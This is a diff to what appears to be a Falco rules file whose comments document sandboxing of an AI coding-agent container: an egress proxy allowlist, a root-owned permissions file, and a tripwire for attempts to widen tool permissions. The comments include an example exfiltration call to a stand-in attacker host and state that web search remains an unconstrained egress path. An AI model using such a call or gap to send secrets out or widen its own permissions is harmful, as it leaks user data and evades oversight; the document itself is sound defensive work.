@@ -660,6 +660,41 @@
 #     settings in claude-code" rule below is the Falco tripwire for that
 #     lockdown, mirroring "Write attempt to workspace Squid override"
 #     exactly.
+#     UPDATED 2026-09-18 (same day, follow-up): switched from
+#     `permissions.deny` to `permissions.ask` for WebFetch/WebSearch, now
+#     that egress-proxy also gained SSL Bump (path/query-level filtering,
+#     not just domain-level -- see squid.conf) and a curated
+#     reference-domain allowlist (.squid-claudecode-docker/00-defaults.conf)
+#     -- user's call, trading the hard guarantee for supervised access to
+#     real documentation/search. The root-owned/mode-644 lockdown on
+#     settings.json is unchanged and still load-bearing: it's what stops a
+#     compromised session from rewriting `ask` to `allow`, same as it
+#     stopped rewriting `deny` before. The write-attempt Falco tripwire
+#     rule and both its tests are unaffected (they guard the file, not
+#     which permission list it holds).
+#     CORRECTED 2026-09-18 (same day, second follow-up): the "both are
+#     server-side tools... no connect() happens here" claim above is WRONG
+#     for WebFetch, confirmed live via a real WebFetch call from inside
+#     this exact container: `WebFetch` to a non-allowlisted domain
+#     (simonwillison.net) failed with "proxy refused the connection", the
+#     same failure shape `curl` gets from Squid's CONNECT-level domain
+#     block -- while a call to an allowlisted domain (github.com) succeeded
+#     normally. WebFetch DOES respect this container's HTTP_PROXY/
+#     HTTPS_PROXY and IS gated by the domain allowlist, same as any other
+#     tool in the container -- confirmed both directions, not assumed from
+#     one result. `WebSearch` remains genuinely unconstrained (confirmed
+#     separately: a WebSearch query returned results linking to
+#     simonwillison.net itself, a non-allowlisted domain, with no proxy
+#     involvement) -- it's the one actually-server-side tool of the two.
+#     Net effect: `WebFetch("https://attacker.tld/?d=<secret>")` would
+#     already have been blocked by the domain allowlist before this
+#     session's fix, same as a `curl` call to that URL -- the genuine,
+#     always-was-open gap was `WebSearch` alone, not both tools equally.
+#     The `ask`-mode decision above stands regardless (WebSearch alone is
+#     still worth gating, and `ask` on WebFetch is harmless defense-in-
+#     depth even though the proxy already covers it) -- this correction is
+#     about the stated mechanism/reasoning being wrong, not the mitigation
+#     choice.
 #   - Git-remote exfiltration: DONE 2026-09-18 -- new, concrete,
 #     Falco-detectable gap, not from the AI-agent research above but
 #     surfaced while designing the WebFetch fix's adjacent threat model.
@@ -2076,8 +2111,10 @@
 # Added 2026-09-18, alongside the Dockerfile lockdown of
 # /home/claudecode/.claude/settings.json (chowned to root, write bits
 # dropped for claudecode/UID 1000, so the baked-in WebFetch/WebSearch
-# permissions.deny can't be edited back out from inside a compromised
-# session -- see OPEN ITEMS "Third pass" above for the full writeup).
+# permission list can't be edited back out from inside a compromised
+# session -- see OPEN ITEMS "Third pass" above for the full writeup; that
+# list moved from `deny` to `ask` the same day, this rule and the lockdown
+# it guards are unaffected either way).
 # Detection-side tripwire in case that lockdown is ever bypassed or a
 # future image rebuild drops it -- mirrors "Write attempt to workspace
 # Squid override in claude-code" above exactly (same write-intent-flags
@@ -2089,9 +2126,9 @@
     A write was attempted against /home/claudecode/.claude/settings.json
     inside claude-code. This file is intentionally root-owned/read-only for
     the claudecode user (see Dockerfile) -- it carries the baked-in
-    WebFetch/WebSearch permissions.deny -- a write attempt here means
-    something tried to widen its own tool permissions from inside the
-    sandbox.
+    WebFetch/WebSearch permission list (ask, see OPEN ITEMS) -- a write
+    attempt here means something tried to widen its own tool permissions
+    from inside the sandbox.
   condition: >
     claude_code_container
     and evt.type in (open, openat, openat2)
